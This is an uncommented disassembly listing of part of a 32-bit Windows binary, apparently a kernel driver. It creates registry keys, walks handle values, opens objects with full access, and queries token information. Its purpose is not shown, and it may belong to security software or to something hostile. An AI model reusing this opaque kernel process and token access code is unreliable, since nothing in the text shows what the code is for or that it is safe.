  4045e7:	8b 0d 6c 71 40 00    	mov    0x40716c,%ecx
  4045ed:	8d 70 08             	lea    0x8(%eax),%esi
  4045f0:	8b 09                	mov    (%ecx),%ecx
  4045f2:	8b 89 e4 00 00 00    	mov    0xe4(%ecx),%ecx
  4045f8:	51                   	push   %ecx
  4045f9:	ff 15 3c 71 40 00    	call   *0x40713c
  4045ff:	8b 0d 6c 71 40 00    	mov    0x40716c,%ecx
  404605:	03 f0                	add    %eax,%esi
  404607:	8b 01                	mov    (%ecx),%eax
  404609:	8b 80 e8 00 00 00    	mov    0xe8(%eax),%eax
  40460f:	50                   	push   %eax
  404610:	ff 15 3c 71 40 00    	call   *0x40713c
  404616:	83 c0 18             	add    $0x18,%eax
  404619:	68 51 61 78 58       	push   $0x58786151
  40461e:	03 f0                	add    %eax,%esi
  404620:	56                   	push   %esi
  404621:	6a 01                	push   $0x1
  404623:	ff 15 f4 70 40 00    	call   *0x4070f4
  404629:	8b f8                	mov    %eax,%edi
  40462b:	85 ff                	test   %edi,%edi
  40462d:	75 0e                	jne    0x40463d
  40462f:	5f                   	pop    %edi
  404630:	5e                   	pop    %esi
  404631:	b8 9a 00 00 c0       	mov    $0xc000009a,%eax
  404636:	5b                   	pop    %ebx
  404637:	8b e5                	mov    %ebp,%esp
  404639:	5d                   	pop    %ebp
  40463a:	c2 08 00             	ret    $0x8
  40463d:	6a 02                	push   $0x2
  40463f:	56                   	push   %esi
  404640:	57                   	push   %edi
  404641:	ff 15 44 71 40 00    	call   *0x407144
  404647:	8b f0                	mov    %eax,%esi
  404649:	85 f6                	test   %esi,%esi
  40464b:	0f 88 ab 00 00 00    	js     0x4046fc
  404651:	a1 6c 71 40 00       	mov    0x40716c,%eax
  404656:	8b 00                	mov    (%eax),%eax
  404658:	8b 80 e0 00 00 00    	mov    0xe0(%eax),%eax
  40465e:	50                   	push   %eax
  40465f:	53                   	push   %ebx
  404660:	6a 02                	push   $0x2
  404662:	57                   	push   %edi
  404663:	ff 15 48 71 40 00    	call   *0x407148
  404669:	8b f0                	mov    %eax,%esi
  40466b:	85 f6                	test   %esi,%esi
  40466d:	0f 88 89 00 00 00    	js     0x4046fc
  404673:	a1 6c 71 40 00       	mov    0x40716c,%eax
  404678:	8b 00                	mov    (%eax),%eax
  40467a:	8b 80 e4 00 00 00    	mov    0xe4(%eax),%eax
  404680:	50                   	push   %eax
  404681:	53                   	push   %ebx
  404682:	6a 02                	push   $0x2
  404684:	57                   	push   %edi
  404685:	ff 15 48 71 40 00    	call   *0x407148
  40468b:	8b f0                	mov    %eax,%esi
  40468d:	85 f6                	test   %esi,%esi
  40468f:	78 6b                	js     0x4046fc
  404691:	a1 6c 71 40 00       	mov    0x40716c,%eax
  404696:	8b 00                	mov    (%eax),%eax
  404698:	8b 80 e8 00 00 00    	mov    0xe8(%eax),%eax
  40469e:	50                   	push   %eax
  40469f:	53                   	push   %ebx
  4046a0:	6a 02                	push   $0x2
  4046a2:	57                   	push   %edi
  4046a3:	ff 15 48 71 40 00    	call   *0x407148
  4046a9:	8b f0                	mov    %eax,%esi
  4046ab:	85 f6                	test   %esi,%esi
  4046ad:	78 4d                	js     0x4046fc
  4046af:	6a 01                	push   $0x1
  4046b1:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4046b4:	50                   	push   %eax
  4046b5:	ff 15 0c 71 40 00    	call   *0x40710c
  4046bb:	8b f0                	mov    %eax,%esi
  4046bd:	85 f6                	test   %esi,%esi
  4046bf:	78 3b                	js     0x4046fc
  4046c1:	6a 00                	push   $0x0
  4046c3:	57                   	push   %edi
  4046c4:	6a 01                	push   $0x1
  4046c6:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4046c9:	50                   	push   %eax
  4046ca:	ff 15 10 71 40 00    	call   *0x407110
  4046d0:	8b f0                	mov    %eax,%esi
  4046d2:	85 f6                	test   %esi,%esi
  4046d4:	78 26                	js     0x4046fc
  4046d6:	6a 00                	push   $0x0
  4046d8:	ff 75 fc             	push   -0x4(%ebp)
  4046db:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4046de:	50                   	push   %eax
  4046df:	ff 15 4c 71 40 00    	call   *0x40714c
  4046e5:	8b f0                	mov    %eax,%esi
  4046e7:	85 f6                	test   %esi,%esi
  4046e9:	78 11                	js     0x4046fc
  4046eb:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4046ee:	50                   	push   %eax
  4046ef:	6a 05                	push   $0x5
  4046f1:	ff 75 08             	push   0x8(%ebp)
  4046f4:	ff 15 5c 71 40 00    	call   *0x40715c
  4046fa:	8b f0                	mov    %eax,%esi
  4046fc:	68 51 61 78 58       	push   $0x58786151
  404701:	57                   	push   %edi
  404702:	ff 15 ac 71 40 00    	call   *0x4071ac
  404708:	5f                   	pop    %edi
  404709:	8b c6                	mov    %esi,%eax
  40470b:	5e                   	pop    %esi
  40470c:	5b                   	pop    %ebx
  40470d:	8b e5                	mov    %ebp,%esp
  40470f:	5d                   	pop    %ebp
  404710:	c2 08 00             	ret    $0x8
  404713:	cc                   	int3
  404714:	cc                   	int3
  404715:	cc                   	int3
  404716:	cc                   	int3
  404717:	cc                   	int3
  404718:	cc                   	int3
  404719:	cc                   	int3
  40471a:	cc                   	int3
  40471b:	cc                   	int3
  40471c:	cc                   	int3
  40471d:	cc                   	int3
  40471e:	cc                   	int3
  40471f:	cc                   	int3
  404720:	ff 25 a0 70 40 00    	jmp    *0x4070a0
  404726:	cc                   	int3
  404727:	cc                   	int3
  404728:	cc                   	int3
  404729:	cc                   	int3
  40472a:	cc                   	int3
  40472b:	cc                   	int3
  40472c:	cc                   	int3
  40472d:	cc                   	int3
  40472e:	cc                   	int3
  40472f:	cc                   	int3
  404730:	55                   	push   %ebp
  404731:	8b ec                	mov    %esp,%ebp
  404733:	6a 00                	push   $0x0
  404735:	6a 01                	push   $0x1
  404737:	ff 75 08             	push   0x8(%ebp)
  40473a:	ff 15 9c 71 40 00    	call   *0x40719c
  404740:	5d                   	pop    %ebp
  404741:	c2 04 00             	ret    $0x4
  404744:	cc                   	int3
  404745:	cc                   	int3
  404746:	cc                   	int3
  404747:	cc                   	int3
  404748:	cc                   	int3
  404749:	cc                   	int3
  40474a:	cc                   	int3
  40474b:	cc                   	int3
  40474c:	cc                   	int3
  40474d:	cc                   	int3
  40474e:	cc                   	int3
  40474f:	cc                   	int3
  404750:	55                   	push   %ebp
  404751:	8b ec                	mov    %esp,%ebp
  404753:	83 ec 24             	sub    $0x24,%esp
  404756:	ff 75 08             	push   0x8(%ebp)
  404759:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40475c:	50                   	push   %eax
  40475d:	ff 15 b0 71 40 00    	call   *0x4071b0
  404763:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404766:	c7 45 dc 18 00 00 00 	movl   $0x18,-0x24(%ebp)
  40476d:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404770:	8d 45 fc             	lea    -0x4(%ebp),%eax
  404773:	50                   	push   %eax
  404774:	6a 00                	push   $0x0
  404776:	6a 00                	push   $0x0
  404778:	6a 00                	push   $0x0
  40477a:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40477d:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  404784:	50                   	push   %eax
  404785:	68 3f 00 0f 00       	push   $0xf003f
  40478a:	ff 75 0c             	push   0xc(%ebp)
  40478d:	c7 45 e8 40 02 00 00 	movl   $0x240,-0x18(%ebp)
  404794:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  40479b:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  4047a2:	ff 15 24 71 40 00    	call   *0x407124
  4047a8:	85 c0                	test   %eax,%eax
  4047aa:	78 18                	js     0x4047c4
  4047ac:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4047af:	83 f8 01             	cmp    $0x1,%eax
  4047b2:	74 10                	je     0x4047c4
  4047b4:	83 f8 02             	cmp    $0x2,%eax
  4047b7:	74 0b                	je     0x4047c4
  4047b9:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
  4047be:	8b e5                	mov    %ebp,%esp
  4047c0:	5d                   	pop    %ebp
  4047c1:	c2 08 00             	ret    $0x8
  4047c4:	33 c0                	xor    %eax,%eax
  4047c6:	8b e5                	mov    %ebp,%esp
  4047c8:	5d                   	pop    %ebp
  4047c9:	c2 08 00             	ret    $0x8
  4047cc:	cc                   	int3
  4047cd:	cc                   	int3
  4047ce:	cc                   	int3
  4047cf:	cc                   	int3
  4047d0:	55                   	push   %ebp
  4047d1:	8b ec                	mov    %esp,%ebp
  4047d3:	53                   	push   %ebx
  4047d4:	68 51 61 78 58       	push   $0x58786151
  4047d9:	6a 28                	push   $0x28
  4047db:	6a 00                	push   $0x0
  4047dd:	ff 15 f4 70 40 00    	call   *0x4070f4
  4047e3:	8b d8                	mov    %eax,%ebx
  4047e5:	85 db                	test   %ebx,%ebx
  4047e7:	74 55                	je     0x40483e
  4047e9:	53                   	push   %ebx
  4047ea:	ff 15 c8 70 40 00    	call   *0x4070c8
  4047f0:	84 c0                	test   %al,%al
  4047f2:	74 4a                	je     0x40483e
  4047f4:	56                   	push   %esi
  4047f5:	57                   	push   %edi
  4047f6:	6a ff                	push   $0xffffffff
  4047f8:	68 f0 d8 ff ff       	push   $0xffffd8f0
  4047fd:	6a 00                	push   $0x0
  4047ff:	ff 75 08             	push   0x8(%ebp)
  404802:	e8 24 21 00 00       	call   0x40692b
  404807:	6a 00                	push   $0x0
  404809:	53                   	push   %ebx
  40480a:	8b f8                	mov    %eax,%edi
  40480c:	8b f2                	mov    %edx,%esi
  40480e:	ff 15 18 71 40 00    	call   *0x407118
  404814:	6a 00                	push   $0x0
  404816:	6a 00                	push   $0x0
  404818:	56                   	push   %esi
  404819:	57                   	push   %edi
  40481a:	53                   	push   %ebx
  40481b:	ff 15 1c 71 40 00    	call   *0x40711c
  404821:	6a 00                	push   $0x0
  404823:	6a 00                	push   $0x0
  404825:	6a 00                	push   $0x0
  404827:	6a 00                	push   $0x0
  404829:	53                   	push   %ebx
  40482a:	ff 15 94 71 40 00    	call   *0x407194
  404830:	68 51 61 78 58       	push   $0x58786151
  404835:	53                   	push   %ebx
  404836:	ff 15 ac 71 40 00    	call   *0x4071ac
  40483c:	5f                   	pop    %edi
  40483d:	5e                   	pop    %esi
  40483e:	5b                   	pop    %ebx
  40483f:	5d                   	pop    %ebp
  404840:	c2 04 00             	ret    $0x4
  404843:	cc                   	int3
  404844:	cc                   	int3
  404845:	cc                   	int3
  404846:	cc                   	int3
  404847:	cc                   	int3
  404848:	cc                   	int3
  404849:	cc                   	int3
  40484a:	cc                   	int3
  40484b:	cc                   	int3
  40484c:	cc                   	int3
  40484d:	cc                   	int3
  40484e:	cc                   	int3
  40484f:	cc                   	int3
  404850:	55                   	push   %ebp
  404851:	8b ec                	mov    %esp,%ebp
  404853:	81 ec 20 01 00 00    	sub    $0x120,%esp
  404859:	a1 a4 a7 40 00       	mov    0x40a7a4,%eax
  40485e:	33 c5                	xor    %ebp,%eax
  404860:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404863:	66 83 3d 98 e9 40 00 	cmpw   $0x0,0x40e998
  40486a:	00 
  40486b:	53                   	push   %ebx
  40486c:	56                   	push   %esi
  40486d:	57                   	push   %edi
  40486e:	c7 85 f4 fe ff ff 00 	movl   $0x0,-0x10c(%ebp)
  404875:	00 00 00 
  404878:	c7 85 f0 fe ff ff 00 	movl   $0x0,-0x110(%ebp)
  40487f:	00 00 00 
  404882:	c7 85 e0 fe ff ff 00 	movl   $0x0,-0x120(%ebp)
  404889:	00 00 00 
  40488c:	c7 85 e4 fe ff ff 00 	movl   $0x0,-0x11c(%ebp)
  404893:	00 00 00 
  404896:	c7 85 e8 fe ff ff 00 	movl   $0x0,-0x118(%ebp)
  40489d:	00 00 00 
  4048a0:	0f 85 6d 02 00 00    	jne    0x404b13
  4048a6:	c7 85 ec fe ff ff 00 	movl   $0x0,-0x114(%ebp)
  4048ad:	00 00 00 
  4048b0:	bb 04 00 00 00       	mov    $0x4,%ebx
  4048b5:	eb 09                	jmp    0x4048c0
  4048b7:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4048be:	8b ff                	mov    %edi,%edi
  4048c0:	68 00 01 00 00       	push   $0x100
  4048c5:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  4048cb:	6a 00                	push   $0x0
  4048cd:	50                   	push   %eax
  4048ce:	e8 fd 1f 00 00       	call   0x4068d0
  4048d3:	83 c4 0c             	add    $0xc,%esp
  4048d6:	85 db                	test   %ebx,%ebx
  4048d8:	0f 84 92 00 00 00    	je     0x404970
  4048de:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  4048e4:	c7 85 f8 fe ff ff 00 	movl   $0x0,-0x108(%ebp)
  4048eb:	00 00 00 
  4048ee:	50                   	push   %eax
  4048ef:	53                   	push   %ebx
  4048f0:	ff 15 50 71 40 00    	call   *0x407150
  4048f6:	85 c0                	test   %eax,%eax
  4048f8:	78 76                	js     0x404970
  4048fa:	ff b5 f8 fe ff ff    	push   -0x108(%ebp)
  404900:	ff 15 60 71 40 00    	call   *0x407160
  404906:	8b 8d f8 fe ff ff    	mov    -0x108(%ebp),%ecx
  40490c:	8b f0                	mov    %eax,%esi
  40490e:	ff 15 8c 70 40 00    	call   *0x40708c
  404914:	85 f6                	test   %esi,%esi
  404916:	74 58                	je     0x404970
  404918:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  40491e:	33 ff                	xor    %edi,%edi
  404920:	50                   	push   %eax
  404921:	ff 15 c8 70 40 00    	call   *0x4070c8
  404927:	84 c0                	test   %al,%al
  404929:	74 72                	je     0x40499d
  40492b:	56                   	push   %esi
  40492c:	ff 15 c8 70 40 00    	call   *0x4070c8
  404932:	84 c0                	test   %al,%al
  404934:	74 67                	je     0x40499d
  404936:	80 3e 00             	cmpb   $0x0,(%esi)
  404939:	74 62                	je     0x40499d
  40493b:	8d 8d fc fe ff ff    	lea    -0x104(%ebp),%ecx
  404941:	2b ce                	sub    %esi,%ecx
  404943:	81 ff ff 00 00 00    	cmp    $0xff,%edi
  404949:	73 0c                	jae    0x404957
  40494b:	8a 06                	mov    (%esi),%al
  40494d:	47                   	inc    %edi
  40494e:	88 04 31             	mov    %al,(%ecx,%esi,1)
  404951:	46                   	inc    %esi
  404952:	80 3e 00             	cmpb   $0x0,(%esi)
  404955:	75 ec                	jne    0x404943
  404957:	85 ff                	test   %edi,%edi
  404959:	74 42                	je     0x40499d
  40495b:	81 ff fe 00 00 00    	cmp    $0xfe,%edi
  404961:	77 0d                	ja     0x404970
  404963:	c6 84 3d fc fe ff ff 	movb   $0x0,-0x104(%ebp,%edi,1)
  40496a:	00 
  40496b:	eb 03                	jmp    0x404970
  40496d:	8d 49 00             	lea    0x0(%ecx),%ecx
  404970:	6a 06                	push   $0x6
  404972:	e8 b9 d1 ff ff       	call   0x401b30
  404977:	50                   	push   %eax
  404978:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  40497e:	50                   	push   %eax
  40497f:	e8 9b 1f 00 00       	call   0x40691f
  404984:	83 c4 08             	add    $0x8,%esp
  404987:	85 c0                	test   %eax,%eax
  404989:	74 12                	je     0x40499d
  40498b:	8d 85 ec fe ff ff    	lea    -0x114(%ebp),%eax
  404991:	50                   	push   %eax
  404992:	53                   	push   %ebx
  404993:	ff 15 50 71 40 00    	call   *0x407150
  404999:	85 c0                	test   %eax,%eax
  40499b:	79 22                	jns    0x4049bf
  40499d:	83 c3 04             	add    $0x4,%ebx
  4049a0:	81 fb 00 00 01 00    	cmp    $0x10000,%ebx
  4049a6:	0f 82 14 ff ff ff    	jb     0x4048c0
  4049ac:	5f                   	pop    %edi
  4049ad:	5e                   	pop    %esi
  4049ae:	33 c0                	xor    %eax,%eax
  4049b0:	5b                   	pop    %ebx
  4049b1:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4049b4:	33 cd                	xor    %ebp,%ecx
  4049b6:	e8 bb 22 00 00       	call   0x406c76
  4049bb:	8b e5                	mov    %ebp,%esp
  4049bd:	5d                   	pop    %ebp
  4049be:	c3                   	ret
  4049bf:	8b 9d ec fe ff ff    	mov    -0x114(%ebp),%ebx
  4049c5:	85 db                	test   %ebx,%ebx
  4049c7:	0f 84 33 01 00 00    	je     0x404b00
  4049cd:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  4049d3:	50                   	push   %eax
  4049d4:	a1 68 71 40 00       	mov    0x407168,%eax
  4049d9:	6a 00                	push   $0x0
  4049db:	8b 00                	mov    (%eax),%eax
  4049dd:	50                   	push   %eax
  4049de:	68 ff ff 1f 00       	push   $0x1fffff
  4049e3:	6a 00                	push   $0x0
  4049e5:	6a 00                	push   $0x0
  4049e7:	53                   	push   %ebx
  4049e8:	ff 15 54 71 40 00    	call   *0x407154
  4049ee:	85 c0                	test   %eax,%eax
  4049f0:	0f 88 d6 00 00 00    	js     0x404acc
  4049f6:	8d 85 f0 fe ff ff    	lea    -0x110(%ebp),%eax
  4049fc:	50                   	push   %eax
  4049fd:	68 00 02 00 00       	push   $0x200
  404a02:	68 08 00 02 00       	push   $0x20008
  404a07:	ff b5 f4 fe ff ff    	push   -0x10c(%ebp)
  404a0d:	ff 15 58 71 40 00    	call   *0x407158
  404a13:	85 c0                	test   %eax,%eax
  404a15:	0f 88 b1 00 00 00    	js     0x404acc
  404a1b:	68 51 61 78 58       	push   $0x58786151
  404a20:	bf 00 10 00 00       	mov    $0x1000,%edi
  404a25:	57                   	push   %edi
  404a26:	6a 01                	push   $0x1
  404a28:	ff 15 f4 70 40 00    	call   *0x4070f4
  404a2e:	8b f0                	mov    %eax,%esi
  404a30:	85 f6                	test   %esi,%esi
  404a32:	0f 84 94 00 00 00    	je     0x404acc
  404a38:	56                   	push   %esi
  404a39:	ff 15 c8 70 40 00    	call   *0x4070c8
  404a3f:	84 c0                	test   %al,%al
  404a41:	0f 84 85 00 00 00    	je     0x404acc
  404a47:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  404a4d:	50                   	push   %eax
  404a4e:	57                   	push   %edi
  404a4f:	56                   	push   %esi
  404a50:	6a 01                	push   $0x1
  404a52:	ff b5 f0 fe ff ff    	push   -0x110(%ebp)
  404a58:	ff 15 38 71 40 00    	call   *0x407138
  404a5e:	3d 23 00 00 c0       	cmp    $0xc0000023,%eax
  404a63:	75 2f                	jne    0x404a94
  404a65:	68 51 61 78 58       	push   $0x58786151
  404a6a:	56                   	push   %esi
  404a6b:	ff 15 ac 71 40 00    	call   *0x4071ac
  404a71:	68 51 61 78 58       	push   $0x58786151
  404a76:	03 ff                	add    %edi,%edi
  404a78:	57                   	push   %edi
  404a79:	6a 01                	push   $0x1
  404a7b:	ff 15 f4 70 40 00    	call   *0x4070f4
  404a81:	8b f0                	mov    %eax,%esi
  404a83:	85 f6                	test   %esi,%esi
  404a85:	74 45                	je     0x404acc
  404a87:	56                   	push   %esi
  404a88:	ff 15 c8 70 40 00    	call   *0x4070c8
  404a8e:	84 c0                	test   %al,%al
  404a90:	75 b5                	jne    0x404a47
  404a92:	eb 38                	jmp    0x404acc
  404a94:	85 c0                	test   %eax,%eax
  404a96:	78 28                	js     0x404ac0
  404a98:	b8 00 02 00 00       	mov    $0x200,%eax
  404a9d:	c7 85 e8 fe ff ff 98 	movl   $0x40e998,-0x118(%ebp)
  404aa4:	e9 40 00 
  404aa7:	66 89 85 e6 fe ff ff 	mov    %ax,-0x11a(%ebp)
  404aae:	8b 06                	mov    (%esi),%eax
  404ab0:	6a 00                	push   $0x0
  404ab2:	50                   	push   %eax
  404ab3:	8d 85 e4 fe ff ff    	lea    -0x11c(%ebp),%eax
  404ab9:	50                   	push   %eax
  404aba:	ff 15 40 71 40 00    	call   *0x407140
  404ac0:	68 51 61 78 58       	push   $0x58786151
  404ac5:	56                   	push   %esi
  404ac6:	ff 15 ac 71 40 00    	call   *0x4071ac
  404acc:	8b cb                	mov    %ebx,%ecx
  404ace:	ff 15 8c 70 40 00    	call   *0x40708c
  404ad4:	8b 85 f4 fe ff ff    	mov    -0x10c(%ebp),%eax
  404ada:	85 c0                	test   %eax,%eax
  404adc:	74 07                	je     0x404ae5
  404ade:	50                   	push   %eax
  404adf:	ff 15 a0 70 40 00    	call   *0x4070a0
  404ae5:	8b 85 f0 fe ff ff    	mov    -0x110(%ebp),%eax
  404aeb:	85 c0                	test   %eax,%eax
  404aed:	74 07                	je     0x404af6
  404aef:	50                   	push   %eax
  404af0:	ff 15 a0 70 40 00    	call   *0x4070a0
  404af6:	66 83 3d 98 e9 40 00 	cmpw   $0x0,0x40e998
  404afd:	00 
  404afe:	75 13                	jne    0x404b13
  404b00:	5f                   	pop    %edi
  404b01:	5e                   	pop    %esi
  404b02:	33 c0                	xor    %eax,%eax
  404b04:	5b                   	pop    %ebx
  404b05:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404b08:	33 cd                	xor    %ebp,%ecx
  404b0a:	e8 67 21 00 00       	call   0x406c76
  404b0f:	8b e5                	mov    %ebp,%esp
  404b11:	5d                   	pop    %ebp
  404b12:	c3                   	ret
  404b13:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404b16:	b8 98 e9 40 00       	mov    $0x40e998,%eax
  404b1b:	5f                   	pop    %edi
  404b1c:	5e                   	pop    %esi
  404b1d:	33 cd                	xor    %ebp,%ecx
  404b1f:	5b                   	pop    %ebx
  404b20:	e8 51 21 00 00       	call   0x406c76
  404b25:	8b e5                	mov    %ebp,%esp
  404b27:	5d                   	pop    %ebp
  404b28:	c3                   	ret
  404b29:	cc                   	int3
  404b2a:	cc                   	int3
  404b2b:	cc                   	int3
  404b2c:	cc                   	int3
  404b2d:	cc                   	int3
  404b2e:	cc                   	int3
  404b2f:	cc                   	int3
  404b30:	55                   	push   %ebp
  404b31:	8b ec                	mov    %esp,%ebp
  404b33:	83 ec 30             	sub    $0x30,%esp
  404b36:	ff 75 0c             	push   0xc(%ebp)
  404b39:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404b3c:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  404b43:	50                   	push   %eax
  404b44:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  404b4b:	ff 15 b0 71 40 00    	call   *0x4071b0
  404b51:	ff 75 08             	push   0x8(%ebp)
  404b54:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404b57:	50                   	push   %eax
  404b58:	ff 15 b0 71 40 00    	call   *0x4071b0
  404b5e:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404b61:	c7 45 d0 18 00 00 00 	movl   $0x18,-0x30(%ebp)
  404b68:	89 45 d8             	mov    %eax,-0x28(%ebp)
  404b6b:	8d 45 d0             	lea    -0x30(%ebp),%eax
  404b6e:	50                   	push   %eax
  404b6f:	68 3f 00 0f 00       	push   $0xf003f
  404b74:	8d 45 fc             	lea    -0x4(%ebp),%eax
  404b77:	c7 45 d4 00 00 00 00 	movl   $0x0,-0x2c(%ebp)
  404b7e:	50                   	push   %eax
  404b7f:	c7 45 dc 40 02 00 00 	movl   $0x240,-0x24(%ebp)
  404b86:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  404b8d:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  404b94:	ff 15 28 71 40 00    	call   *0x407128
  404b9a:	85 c0                	test   %eax,%eax
  404b9c:	0f 88 86 00 00 00    	js     0x404c28
  404ba2:	56                   	push   %esi
  404ba3:	8d 45 f8             	lea    -0x8(%ebp),%eax
  404ba6:	50                   	push   %eax
  404ba7:	6a 00                	push   $0x0
  404ba9:	6a 00                	push   $0x0
  404bab:	6a 02                	push   $0x2
  404bad:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404bb0:	50                   	push   %eax
  404bb1:	ff 75 fc             	push   -0x4(%ebp)
  404bb4:	ff 15 30 71 40 00    	call   *0x407130
  404bba:	3d 34 00 00 c0       	cmp    $0xc0000034,%eax
  404bbf:	74 58                	je     0x404c19
  404bc1:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404bc4:	85 c0                	test   %eax,%eax
  404bc6:	74 51                	je     0x404c19
  404bc8:	68 51 61 78 58       	push   $0x58786151
  404bcd:	50                   	push   %eax
  404bce:	6a 01                	push   $0x1
  404bd0:	ff 15 f4 70 40 00    	call   *0x4070f4
  404bd6:	8b f0                	mov    %eax,%esi
  404bd8:	85 f6                	test   %esi,%esi
  404bda:	74 3d                	je     0x404c19
  404bdc:	56                   	push   %esi
  404bdd:	ff 15 c8 70 40 00    	call   *0x4070c8
  404be3:	84 c0                	test   %al,%al
  404be5:	74 32                	je     0x404c19
  404be7:	8d 45 f8             	lea    -0x8(%ebp),%eax
  404bea:	50                   	push   %eax
  404beb:	ff 75 f8             	push   -0x8(%ebp)
  404bee:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404bf1:	56                   	push   %esi
  404bf2:	6a 02                	push   $0x2
  404bf4:	50                   	push   %eax
  404bf5:	ff 75 fc             	push   -0x4(%ebp)
  404bf8:	ff 15 30 71 40 00    	call   *0x407130
  404bfe:	85 c0                	test   %eax,%eax
  404c00:	78 17                	js     0x404c19
  404c02:	8b 45 10             	mov    0x10(%ebp),%eax
  404c05:	ff 75 fc             	push   -0x4(%ebp)
  404c08:	89 30                	mov    %esi,(%eax)
  404c0a:	ff 15 a0 70 40 00    	call   *0x4070a0
  404c10:	33 c0                	xor    %eax,%eax
  404c12:	5e                   	pop    %esi
  404c13:	8b e5                	mov    %ebp,%esp
  404c15:	5d                   	pop    %ebp
  404c16:	c2 0c 00             	ret    $0xc
  404c19:	ff 75 fc             	push   -0x4(%ebp)
  404c1c:	ff 15 a0 70 40 00    	call   *0x4070a0
  404c22:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
  404c27:	5e                   	pop    %esi
  404c28:	8b e5                	mov    %ebp,%esp
  404c2a:	5d                   	pop    %ebp
  404c2b:	c2 0c 00             	ret    $0xc
  404c2e:	cc                   	int3
  404c2f:	cc                   	int3
  404c30:	55                   	push   %ebp
  404c31:	8b ec                	mov    %esp,%ebp
  404c33:	6a 00                	push   $0x0
  404c35:	6a 00                	push   $0x0
  404c37:	ff 75 08             	push   0x8(%ebp)
  404c3a:	ff 15 98 71 40 00    	call   *0x407198
  404c40:	5d                   	pop    %ebp
  404c41:	c2 04 00             	ret    $0x4
  404c44:	cc                   	int3
  404c45:	cc                   	int3
  404c46:	cc                   	int3
  404c47:	cc                   	int3
  404c48:	cc                   	int3
  404c49:	cc                   	int3
  404c4a:	cc                   	int3
  404c4b:	cc                   	int3
  404c4c:	cc                   	int3
  404c4d:	cc                   	int3
  404c4e:	cc                   	int3
  404c4f:	cc                   	int3
  404c50:	55                   	push   %ebp
  404c51:	8b ec                	mov    %esp,%ebp
  404c53:	83 ec 30             	sub    $0x30,%esp
  404c56:	ff 75 0c             	push   0xc(%ebp)
  404c59:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404c5c:	50                   	push   %eax
  404c5d:	ff 15 b0 71 40 00    	call   *0x4071b0
  404c63:	ff 75 08             	push   0x8(%ebp)
  404c66:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404c69:	50                   	push   %eax
  404c6a:	ff 15 b0 71 40 00    	call   *0x4071b0
  404c70:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404c73:	c7 45 d0 18 00 00 00 	movl   $0x18,-0x30(%ebp)
  404c7a:	89 45 d8             	mov    %eax,-0x28(%ebp)
  404c7d:	8d 45 f8             	lea    -0x8(%ebp),%eax
  404c80:	50                   	push   %eax
  404c81:	6a 00                	push   $0x0
  404c83:	6a 00                	push   $0x0
  404c85:	6a 00                	push   $0x0
  404c87:	8d 45 d0             	lea    -0x30(%ebp),%eax
  404c8a:	c7 45 d4 00 00 00 00 	movl   $0x0,-0x2c(%ebp)
  404c91:	50                   	push   %eax
  404c92:	68 3f 00 0f 00       	push   $0xf003f
  404c97:	8d 45 fc             	lea    -0x4(%ebp),%eax
  404c9a:	c7 45 dc 40 02 00 00 	movl   $0x240,-0x24(%ebp)
  404ca1:	50                   	push   %eax
  404ca2:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  404ca9:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  404cb0:	ff 15 24 71 40 00    	call   *0x407124
  404cb6:	85 c0                	test   %eax,%eax
  404cb8:	78 16                	js     0x404cd0
  404cba:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404cbd:	83 f8 01             	cmp    $0x1,%eax
  404cc0:	74 0e                	je     0x404cd0
  404cc2:	83 f8 02             	cmp    $0x2,%eax
  404cc5:	74 09                	je     0x404cd0
  404cc7:	83 c8 ff             	or     $0xffffffff,%eax
  404cca:	8b e5                	mov    %ebp,%esp
  404ccc:	5d                   	pop    %ebp
  404ccd:	c2 14 00             	ret    $0x14
  404cd0:	56                   	push   %esi
  404cd1:	ff 75 18             	push   0x18(%ebp)
  404cd4:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404cd7:	ff 75 14             	push   0x14(%ebp)
  404cda:	ff 75 10             	push   0x10(%ebp)
  404cdd:	6a 00                	push   $0x0
  404cdf:	50                   	push   %eax
  404ce0:	ff 75 fc             	push   -0x4(%ebp)
  404ce3:	ff 15 34 71 40 00    	call   *0x407134
  404ce9:	ff 75 fc             	push   -0x4(%ebp)
  404cec:	8b f0                	mov    %eax,%esi
  404cee:	ff 15 2c 71 40 00    	call   *0x40712c
  404cf4:	ff 75 fc             	push   -0x4(%ebp)
